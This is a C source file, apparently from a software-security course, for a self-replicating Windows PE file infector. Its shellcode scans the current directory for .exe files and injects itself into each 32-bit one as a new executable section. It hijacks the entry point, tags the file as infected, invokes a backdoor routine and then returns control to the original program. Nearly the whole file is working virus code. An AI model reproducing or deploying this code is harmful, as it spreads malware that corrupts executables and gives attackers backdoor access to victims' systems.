#include <Windows.h>
#include "typedef.h"
#include "infect.h"
#include "func.h"
#include "backdoor.h"
#include "wfileapi.h"

#pragma code_seg(".advance")

static inline HANDLE OpenTargetA(SCSB *sb, CHAR *name) {
    HANDLE hFile = CreateFileA(
        name,
        GENERIC_READ | GENERIC_WRITE,
        0, NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    return hFile;
}

static inline int InfectTarget(SCSB *sb, HANDLE hFile) {
    int err = 0;
//----------------------------------------------------------------------
#ifdef DEBUG
    puts("Init header pointers...");
#endif DEBUG
    // headers
    /* init in struct SCSB */
    // headers pointer
    PIMAGE_DOS_HEADER pDosHdr = &sb->dosHdr;
    PIMAGE_FILE_HEADER pFileHdr = &sb->fileHdr;
    PIMAGE_OPTIONAL_HEADER32 pOptHdr = &sb->optHdr;
    PIMAGE_SECTION_HEADER pLasSecHdr = &sb->lasSecHdr;
    PIMAGE_SECTION_HEADER pNewSecHdr = &sb->newSecHdr;
//----------------------------------------------------------------------
#ifdef DEBUG
    puts("Parse headers...");
#endif
    // Get DOS Header
    err = ReadOffset(
        sb, hFile, 0, FILE_BEGIN, 
        pDosHdr, sizeof(IMAGE_DOS_HEADER)
    );
    if(err) return -1;
    // Check infected
    if(pDosHdr->e_res[0] == 0x1234) {
#ifdef DEBUG
        puts("Error: Target has been infected!");
#endif
        return 1;
    }
    // Check Signature
    DWORD pe00;
    err = ReadOffset(
        sb, hFile, pDosHdr->e_lfanew, FILE_BEGIN,
        (PVOID)&pe00, sizeof(DWORD)
    );
    if(err) return -1;
    if(pe00 != 0x00004550) {
#ifdef DEBUG
        puts("Error: Not a pe file!");
#endif
        return 2;
    }
    // Get File Header
    err = ReadOffset(
        sb, hFile, 0, FILE_CURRENT, 
        pFileHdr, sizeof(IMAGE_FILE_HEADER)
    );
    if(err) return -1;
    // Get Optional Header
    err = ReadOffset(
        sb, hFile, 0, FILE_CURRENT, 
        pOptHdr, 
        /* 224 when 32 bits, same as pFileHdr->SizeOfOptionalHeader */
        sizeof(IMAGE_OPTIONAL_HEADER32) 
    );
    if(err) return -1;
    if(pOptHdr->Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
#ifdef DEBUG
        puts("Error: Not a 32 bits exe!");
#endif
        return 3;
    }
    // Check Headers Space
    long currentSize = \
        pFileHdr->NumberOfSections * sizeof(IMAGE_SECTION_HEADER) \
        + pDosHdr->e_lfanew + 0x4 \
        + sizeof(IMAGE_FILE_HEADER) \
        + pFileHdr->SizeOfOptionalHeader;
    long alignSize = pOptHdr->SizeOfHeaders;
    if(currentSize + sizeof(IMAGE_SECTION_HEADER) > alignSize) {
#ifdef DEBUG
        puts("Error: No space to insert a new sections!");
#endif
        return 4;
    }
    // Get Last Section Header
    err = ReadOffset(
        sb, hFile, currentSize - sizeof(IMAGE_SECTION_HEADER), FILE_BEGIN, 
        pLasSecHdr, sizeof(IMAGE_SECTION_HEADER)
    );
    if(err) return -1;
//----------------------------------------------------------------------
#ifdef DEBUG
    puts("Calc address...");
#endif
    // Get align
    long fileAlign = pOptHdr->FileAlignment;
    long secAlign = pOptHdr->SectionAlignment; 
    // Set old entry VA
#ifdef DEBUG
    printf("%p %d %d\n", shellCode, JMP_POINT_OFFSET, CODE_SIZE);
#endif
    long oldVA = pOptHdr->AddressOfEntryPoint;
    long *jmpPoint = (void *)(shellCode + JMP_POINT_OFFSET);
    // *jmpPoint = oldVA; !!! you can't exit readonly mem 
    // Calc New Section raw
    long rawNewSec = pLasSecHdr->PointerToRawData + pLasSecHdr->SizeOfRawData;
    // Calc New Section rva 
    long lasVirSize = pLasSecHdr->Misc.VirtualSize;
    if(lasVirSize % secAlign != 0) lasVirSize = (lasVirSize / secAlign + 1) * secAlign;
    long rvaNewSec = pLasSecHdr->VirtualAddress + lasVirSize;
    // Calc New Section raw size
    long raw_size = CODE_SIZE;
    if(CODE_SIZE % fileAlign != 0) raw_size = (CODE_SIZE / fileAlign + 1) * fileAlign;
    // Calc New Section image size
    int vir_size = CODE_SIZE;
    if(CODE_SIZE % secAlign != 0) vir_size = (CODE_SIZE / secAlign + 1) * secAlign;
    // Set New Section Header
    char *sName = pNewSecHdr->Name;
    sName[0] = '.', sName[1] = 'e', sName[2] = 'x';
    sName[3] = sName[4] = sName[5] = sName[6] = sName[7] = 0; /* Something not null when O2*/
    pNewSecHdr->Misc.VirtualSize = CODE_SIZE;
    pNewSecHdr->VirtualAddress = rvaNewSec;
    pNewSecHdr->SizeOfRawData = raw_size;
    pNewSecHdr->PointerToRawData = rawNewSec;
    pNewSecHdr->PointerToRelocations = 0;
    pNewSecHdr->PointerToLinenumbers = 0;
    pNewSecHdr->NumberOfRelocations = 0;
    pNewSecHdr->NumberOfLinenumbers = 0;
    pNewSecHdr->Characteristics = \
        IMAGE_SCN_CNT_CODE | IMAGE_SCN_ALIGN_32BYTES | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;
    // Set Infected tag
    pDosHdr->e_res[0] = 0x1234;
    // Fix File Header
    pFileHdr->NumberOfSections++;
    // Fix Optional Header
    pOptHdr->AddressOfEntryPoint = rvaNewSec;
    pOptHdr->SizeOfImage = rvaNewSec + vir_size;
//----------------------------------------------------------------------
#ifdef DEBUG
    puts("Save changing...");
#endif
    // Saved Dos Header
    err = WriteOffset(
        sb, hFile, 0, FILE_BEGIN,
        pDosHdr, sizeof(IMAGE_DOS_HEADER)
    );
    if(err) return -1;
    // Saved File Header
    err = WriteOffset(
        sb, hFile, pDosHdr->e_lfanew + 0x4, FILE_BEGIN,
        pFileHdr, sizeof(IMAGE_FILE_HEADER)
    );
    if(err) return -1;
    // Saved Optional Header
    err = WriteOffset(
        sb, hFile, 0, FILE_CURRENT,
        pOptHdr,
        sizeof(IMAGE_OPTIONAL_HEADER32)
    );
    if(err) return -1;
    // Saved New Section Header
    err = WriteOffset(
        sb, hFile, currentSize, FILE_BEGIN,
        pNewSecHdr,
        sizeof(IMAGE_SECTION_HEADER)
    );
    if(err) return -1;
    // Saved New Section
    err = WriteOffset(
        sb, hFile, rawNewSec, FILE_BEGIN,
        shellCode, CODE_SIZE
    );
    if(err) return -1;
    // Fix jmp point
    err = WriteOffset(
        sb, hFile, rawNewSec + JMP_POINT_OFFSET, FILE_BEGIN,
        &oldVA, sizeof(DWORD)
    );
    if(err) return -1;
    // Alignment
    err = SetFileSize(sb, hFile, rawNewSec + raw_size);
    if(err) return -1;
    return 0;
}

static inline void ShellCodeMain(SCSB *sb) {
    // find exe in cwd
#ifdef DEBUG_ABS
    CHAR search[58] = {'D', ':', '\\', '_', '_', 'S', 'o', 'f', 't', 'w', 'a', 'r', 'e', '_', 'S', 'e', 'c', '_', '_', '\\', 'P', 'E', '_', 'V', 'i', 'r', 'u', 's', '\\', 'e', 'x', 'a', 'm', 'p', 'l', 'e', 's', '\\', 't', 'e', 's', 't', '\\', 't', 'e', 's', 't', '_', 'd', 'i', 'r', '\\', '*', '.', 'e', 'x', 'e', 0};
#else
    CHAR search[6] = {'*', '.', 'e', 'x', 'e', 0};
#endif
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(search, &findData);
    if(hFind == INVALID_HANDLE_VALUE) return;
    // iterate files
    LPWIN32_FIND_DATAA lpFindData = &findData;
    do {
#ifdef DEBUG
        puts(lpFindData->cFileName);
#endif
        HANDLE hf = OpenTargetA(sb, lpFindData->cFileName);
        if(hf == NULL) continue;
        InfectTarget(sb, hf);
        CloseHandle(hf);
    } while(FindNextFileA(hFind, lpFindData));
    FindClose(hFind);
    return;
}

void ShellCode() {
__code_start:
#ifdef DEBUG
    puts("In Shell Code!");
#endif
    SCSB super_block;
    SCSB *sb = &super_block;
    PPEB peb;
    PBYTE imageBase;
    // get peb
    __asm {
        mov eax, fs:[30h];
        mov peb, eax
    }
    // get imageBase
    imageBase = (PBYTE)peb->Reserved3[1];
    // Get Code info
    PBYTE codeAdr;
    DWORD codeSize, jmpPoint;
    __asm {
        mov eax, __code_end
        sub eax, __code_start
        mov codeSize, eax
        mov eax, __jmp_point
        sub eax, __code_start
        add eax, 1
        mov jmpPoint, eax
    }
    // for shellcode, codeRva = entryRva
    codeAdr = (PBYTE) *(DWORD *)(imageBase + 0x3C); 
    codeAdr = codeAdr + (DWORD)imageBase;// optHdr
    codeAdr = *(DWORD *)(codeAdr + 0x28); // entry rva
    codeAdr = codeAdr + (DWORD)imageBase; 
    sb->_shellCode = codeAdr;
    sb->_CODE_SIZE = codeSize + 0xA; // 0xA is stack pointer operations
    sb->_JMP_POINT_OFFSET = jmpPoint + 0xA;
#ifdef DEBUG
    printf("Base:%#p Codeinfo: %#p %d %d\n", imageBase, codeAdr, codeSize, jmpPoint);
#endif
    // Get funtion pointer
    GetAllFunc(peb, sb);
    // Start infecting
    ShellCodeMain(sb);
    // Open backdoor
    Backdoor(sb);
#ifdef DEBUG
    printf("ss: %#p\n", imageBase);
#endif
    // Return back
    __asm {
        mov eax, imageBase
__jmp_point:
        add eax, 0x11223344
        jmp eax
    }
__code_end:
    return;
}